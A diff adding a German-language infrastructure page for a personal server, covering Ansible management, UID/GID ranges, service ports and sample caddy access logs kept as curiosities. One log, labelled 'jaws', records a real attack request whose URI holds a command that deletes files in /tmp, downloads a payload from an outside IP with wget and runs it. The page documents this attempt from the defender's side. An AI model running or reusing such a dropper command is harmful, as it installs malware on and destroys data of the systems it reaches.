@@ -1,0 +1,184 @@
+---
+title: ryv.xoryves.de
+created_at: 2022-08-03
+updated_at: 2023-04-23
+tags:
+- x5s-infra
+- ssh tarpit
+- endlessh
+- Ansible
+---
+
+== Configuration Management
+
+Ich verwende https://www.ansible.com/[Ansible] zur Verwaltung.
+Alle anderen Lösungen wie https://www.saltstack.com/[Salt], https://puppet.com/open-source/#osp[Puppet], https://www.chef.io/[Chef], https://cfengine.com/[CFEngine] sind übertrieben für einen einzigen Server.
+Einzige Alternative wäre https://www.cdi.st/[cdist].
+Ich bezweifle das cdist so viel einfacher ist als Ansible.
+Zudem verwendet das Void Linux Projekt selbst auch https://github.com/void-linux/void-infrastructure/tree/master/ansible[Ansible].
+
+Teile der Konfiguration sind im https://github.com/xoryves/x5s-infra[x5s-infra] Repo zu finden.
+
+== UID/GID
+
+system:: 100-999
+normal:: 1000-60000
+docker:: 10100-10999
+
+endlessh:: 10100 (obsolete)
+vaultwarden:: 10101
+
+== Ports
+
+* 22 endlessh nftables redirect
+* 80 caddy
+* 443 caddy
+* 2019 caddy admin
+* 2222 endlessh
+* 3011 vaultwarden
+* 3012 vaultwarden websocket
+* 6060 crowdsec prometheus
+* 8080 crowdsec
+* 8081 crowdsec test env
+* 60080 caddy nftables redirect
+* 60443 caddy nftables redirect
+* 65534 dropbear
+* 65535 ssh
+
+== vhosts
+
+diceware:: https://github.com/grempe/diceware[diceware (grempe)]
+
+== interessante logs
+
+=== caddy
+
+.Palo Alto
+[%collapsible, role=listing-block code]
+====
+[source, json]
+----
+{
+  "level": "info",
+  "ts": "2022-09-18T22:30:26.340+0200",
+  "logger": "http.log.access.log2",
+  "msg": "handled request",
+  "request": {
+    "remote_ip": "205.210.31.151",
+    "remote_port": "56379",
+    "proto": "HTTP/1.1",
+    "method": "GET",
+    "host": "xoryves.de",
+    "uri": "/",
+    "headers": {
+      "User-Agent": [
+        "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
+      ]
+    },
+    "tls": {
+      "resumed": false,
+      "version": 771,
+      "cipher_suite": 49195,
+      "proto": "",
+      "server_name": "xoryves.de"
+    }
+  },
+  "user_id": "",
+  "duration": 0.00029879,
+  "size": 5400,
+  "status": 200,
+  "resp_headers": {
+    "Last-Modified": ["Thu, 08 Sep 2022 19:32:29 GMT"],
+    "Accept-Ranges": ["bytes"],
+    "Content-Length": ["5400"],
+    "Server": ["Caddy"],
+    "Etag": ["\"rhwoy5460\""],
+    "Content-Type": ["text/html; charset=utf-8"]
+  }
+}
+----
+====
+
+.CensysInspect
+[%collapsible, role=listing-block code]
+====
+[source, json]
+----
+{
+  "level": "error",
+  "ts": "2022-09-19T22:15:33.626+0200",
+  "logger": "http.log.access",
+  "msg": "handled request",
+  "request": {
+    "remote_ip": "162.142.125.211",
+    "remote_port": "50666",
+    "proto": "HTTP/1.1",
+    "method": "GET",
+    "host": "xoryves.de",
+    "uri": "/",
+    "headers": {
+      "User-Agent": [
+        "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
+      ],
+      "Accept": ["*/*"],
+      "Accept-Encoding": ["gzip"]
+    },
+    "tls": {
+      "resumed": false,
+      "version": 772,
+      "cipher_suite": 4867,
+      "proto": "",
+      "server_name": "xoryves.de"
+    }
+  },
+  "user_id": "",
+  "duration": 0.000369875,
+  "size": 818,
+  "status": 403,
+  "resp_headers": {
+    "Server": ["Caddy"],
+    "Content-Type": ["text/html; charset=utf-8"],
+    "Content-Length": ["818"]
+  }
+}
+----
+====
+
+.jaws
+[%collapsible, role=listing-block code]
+====
+[source, json]
+----
+{
+  "level": "info",
+  "ts": "2022-09-23T21:05:37.168+0200",
+  "logger": "http.log.access",
+  "msg": "handled request",
+  "request": {
+    "remote_ip": "156.198.68.66",
+    "remote_port": "37171",
+    "proto": "HTTP/1.1",
+    "method": "GET",
+    "host": "127.0.0.1:80",
+    "uri": "/shell?cd+/tmp;rm+-rf+*;wget+185.216.71.192/jaws;sh+/tmp/jaws",
+    "headers": {
+      "User-Agent": ["Hello, world"],
+      "Accept": ["text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"],
+      "Connection": ["keep-alive"]
+    }
+  },
+  "user_id": "",
+  "duration": 4.4655e-05,
+  "size": 0,
+  "status": 308,
+  "resp_headers": {
+    "Connection": ["close"],
+    "Location": [
+      "https://127.0.0.1/shell?cd+/tmp;rm+-rf+*;wget+185.216.71.192/jaws;sh+/tmp/jaws"
+    ],
+    "Content-Type": [],
+    "Server": ["Caddy"]
+  }
+}
+----
+====
